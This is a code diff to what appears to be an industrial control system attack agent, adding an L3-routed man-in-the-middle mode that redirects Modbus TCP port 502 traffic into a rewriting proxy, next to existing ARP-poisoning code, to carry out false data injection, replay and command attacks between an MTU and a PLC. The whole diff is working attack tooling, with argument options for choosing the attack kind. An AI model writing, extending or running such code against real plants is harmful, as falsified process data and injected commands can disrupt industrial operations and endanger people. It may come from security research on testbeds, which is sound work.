@@ -81,6 +81,15 @@ class Agent:
     # window toggles the rewrite handler, so out-of-window traffic is the true
     # plant data with no path churn and clean recovery.
     def setup_mitm(self) -> bool:
+        # L3 mode: the attacker is already ON the routed path (it is the router
+        # between the MTU's and the PLC's subnets), so no ARP poisoning is needed
+        # — just REDIRECT the transit :502 connection into the proxy. This keeps
+        # the MTU's persistent TCP session stable (no ARP flapping).
+        if getattr(self.a, "no_arp", False):
+            self._redirect(add=True)
+            self._mitm_up = True
+            self._log("mitm_up", note="l3-routed (no arp)")
+            return True
         self.spoofer = arp.ARPSpoofer(self.iface, self.a.victim_ip, self.a.gw_ip)
         for _ in range(10):
             if self.spoofer.learn():
@@ -99,6 +108,10 @@ class Agent:
 
     def teardown_mitm(self):
         if not getattr(self, "_mitm_up", False):
+            return
+        if getattr(self.a, "no_arp", False):
+            self._redirect(add=False)
+            self._mitm_up = False
             return
         self._arp_stop.set()
         if self._arp_thread:
@@ -168,7 +181,9 @@ def main(argv=None):
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
     ap.add_argument("--kind", default="fdi", choices=["fdi", "replay", "command"])
     ap.add_argument("--victim-ip", required=True)
-    ap.add_argument("--gw-ip", required=True)
+    ap.add_argument("--gw-ip", default="", help="the other poisoned endpoint (ARP mode only)")
+    ap.add_argument("--no-arp", action="store_true",
+                    help="L3-routed mode: skip ARP poisoning (attacker is the router on-path)")
     ap.add_argument("--func", type=int, default=4, choices=[3, 4],
                     help="read function code for fdi/replay")
     ap.add_argument("--reg-type", default="H", choices=["C", "H"],
